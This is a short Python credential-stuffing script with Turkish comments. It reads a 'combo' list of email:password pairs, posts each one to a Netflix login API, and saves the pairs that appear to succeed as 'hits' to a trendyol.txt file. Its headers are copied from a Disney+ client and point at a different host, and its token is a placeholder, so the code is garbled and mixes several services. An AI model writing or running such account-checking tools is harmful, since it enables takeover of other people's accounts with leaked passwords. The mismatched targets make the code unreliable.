import requests

combo_file = input(" ~ Combo : ")

# Komboları ve sonuçları işlemek için dosyaları açıyoruz
with open(combo_file) as file, open("trendyol.txt", "a") as hit:
    for line in file:
        email, sifre = line.strip().split(":")  # Combo'yu ayırıyoruz
        # Giriş için gerekli URL ve JSON payload
        url = "https://www.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0?landingURL=%2Ftr%2Flogin&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&languages=tr-TR&netflixClientPlatform=browser&flow=websiteSignUp&mode=login&method=call&falcor_server=0.1.0&callPath=%5B%22aui%22%2C%22moneyball%22%2C%22next%22%5D"
        headers = {
            "Host": "global.edge.bamgrid.com",
            "X-BAMSDK-Platform": "iPhone7,2",
            "Accept": "application/json; charset=utf-8",
            "X-BAMSDK-Client-ID": "disney-svod-3d9324fc",
            "Authorization": f"Bearer <Tok2>",  # Buradaki <Tok2> token değeri dinamik olmalı
            "X-BAMSDK-Transaction-ID": "B60EB6F9-C59D-4037-827A-6D1E9B707F69",
            "Accept-Language": "en-us",
            "Accept-Encoding": "br, gzip, deflate",
            "X-BAMSDK-Version": "9.9.2",
            "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=1",
            "Content-Length": "67",
            "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0",
            "Connection": "keep-alive"
        }
        data = {
            "email": email,
            "password": sifre
        }

        try:
            # POST isteği gönderiyoruz
            response = requests.post(url, json=data, headers=headers)

            # Yanıtı kontrol et ve başarı durumunu belirle
            if response.status_code == 200 and "success" in response.text.lower():
                hit.write(f"{email}:{sifre}\n")
                print(f"Başarılı ✅: {email}:{sifre}")
            else:
                print(f"Başarısız❌: {email}:{sifre}")
        except requests.RequestException as e:
            print(f"Hata: {e}")
